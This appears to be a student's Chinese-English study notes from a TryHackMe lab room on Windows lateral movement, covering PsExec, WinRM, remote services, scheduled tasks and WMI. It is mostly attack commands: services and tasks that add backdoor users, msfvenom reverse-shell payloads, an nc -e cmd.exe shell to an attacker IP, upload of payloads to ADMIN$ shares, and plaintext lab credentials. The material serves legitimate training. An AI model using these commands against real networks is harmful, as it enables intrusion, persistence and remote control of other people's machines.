		--> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
		--> psexesvc.exe
		--> psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
		
		=> Ports: 445/TCP (SMB)
		=> Required Group Memberships: Administrators
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	WinRM 
		--> 用於遠端向 Windows 主機發送 Powershell 命令
		--> winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
		
		=> Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
		=> Required Group Memberships: Remote Management Users
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	sc遠端 建立服務
		--> sc.exe
			--> 建立並啟動名為「THMservice」的服務
				--> sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
				--> sc.exe \\TARGET start THMservice	
			--> 要停止並刪除該服務
				--> sc.exe \\TARGET stop THMservice
				--> sc.exe \\TARGET delete THMservice	
					
		=> Ports:
			135/TCP, 49152-65535/TCP (DCE/RPC)
			445/TCP (RPC over SMB Named Pipes)
			139/TCP (RPC over SMB Named Pipes)
		=> Required Group Memberships: Administrators	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Scheduled Tasks
		--> 建立名為 THMtask1 的任務
			--> schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
			--> schtasks /s TARGET /run /TN "THMtask1" 		
		--> 刪除計劃任務
			--> schtasks /S TARGET /TN "THMtask1" /DELETE /F
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	反向 shell -- exe-service
		--> kali : 
			=> msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.77.150 LPORT=4444 -o A1111.exe
			=> smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put A1111.exe' --option="client min protocol=core"
			=> msfconsole -qx "use exploit/multi/handler;set LHOST lateralmovement;set LPORT 4444;set payload windows/shell/reverse_tcp;"
			=> sudo  nc -lvp 4443
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> ssh(damien.horton )
			=> ssh za.tryhackme.com\\damien.horton@thmjmp1.za.tryhackme.com | pABqHYKsG8L7	
			=> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.77.150 4443"
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> cmd (t1_leonard.summers)
			=> sc.exe \\thmiis.za.tryhackme.com create THMservice-6758 binPath= "%windir%\A1111.exe" start= auto
			=> sc.exe \\thmiis.za.tryhackme.com start THMservice-6758
		--> nt authority\system	
			=> Flag.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Windows Management Instrumentation ( WMI )
		=> WMI 允許管理員執行標準管理任務
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	從 Powershell連線到WMI :
		DCOM：  RPC over IP 將用於連接到 WMI。協定使用連接埠 135/ TCP和連接埠 49152-65535/ TCP，如使用 sc.exe 時所解釋的那樣。
		Wsman：  WinRM 將用於連接到 WMI。此協定使用連接埠 5985/TCP (WinRM  HTTP ) 或 5986/ TCP (WinRM HTTPS)。	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		PSCredential 物件
			$username = 'Administrator';
			$password = 'Mypass123';
			$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
			$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			Enter-PSSession -Computername TARGET -Credential $credential	
			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		建立WMI會話 :
			$Opt = New-CimSessionOption -Protocol DCOM //配置WMI會話的連線選項，包括連線協定
			$Session = New-Cimsession -ComputerName TARGET -Credential //建立針對遠端主機的會話
			$credential -SessionOption $Opt -ErrorAction Stop
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用WMI遠端建立進程 :
		Ports:
			135/TCP, 49152-65535/TCP (DCERPC)
			5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
		Required Group Memberships: Administrators	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		向 Win32_Process 類別發送WMI請求 :	
			$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
			Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
			CommandLine = $Command
			}	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		使用 wmic: 	
			wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用WMI遠端建立服務 :	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		建立名為 THMService2 的服務 : 
			Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
			Name = "THMService2";
			DisplayName = "THMService2";
			PathName = "net user munra2 Pass123 /add"; # Your payload
			ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
			StartMode = "Manual"
			}
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~			
		啟動它 :
			$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
			Invoke-CimMethod -InputObject $Service -MethodName StartService
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
		停止並刪除該服務 :	
			Invoke-CimMethod -InputObject $Service -MethodName StopService
			Invoke-CimMethod -InputObject $Service -MethodName Delete	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	使用WMI遠端建立排程任務	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		建立並執行排程任務 :
			# Payload must be split in Command and Args
			$Command = "cmd.exe"
			$Args = "/c net user munra22 aSdf1234 /add"

			$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
			Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
			Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"	
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		使用完計劃任務後將其刪除 :
			Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	透過WMI安裝 MSI 套件
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		嘗試透過WMI呼叫 Win32_Product 類別來安裝它
			Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		使用 wmic
			wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> ssh za\\damien.horton@thmjmp2.za.tryhackme.com
		=> pABqHYKsG8L7
	--> 管理存取權限的憑證
		=> ZA.TRYHACKME.COM\t1_corine.waters：  Korine.1994
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstler020.msi	
	--> smbclient -c 'put myinstler020.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994	
	--> msfconsole -qx "use exploit/multi/handler;set LHOST lateralmovement;set LPORT 4445;set payload windows/x64/shell_reverse_tcp"	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	啟動針對 THMIIS 的WMI會話 :	
		$username = 't1_corine.waters';
		$password = 'Korine.1994';
		$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
		$credential = New-Object System.Management.Automation.PSCredential $username,$securePassword;
		$Opt = New-CimSessionOption -Protocol DCOM
		$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	從 Win32_Product 類別呼叫 Install 方法來觸發有效負載 :	
	Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
	
## Exploiting Active Directory
## Persisting Active Directory
## Credentials Harvesting
## hololive
	--> https://tryhackme.com/r/room/hololive(Authentication Relays)
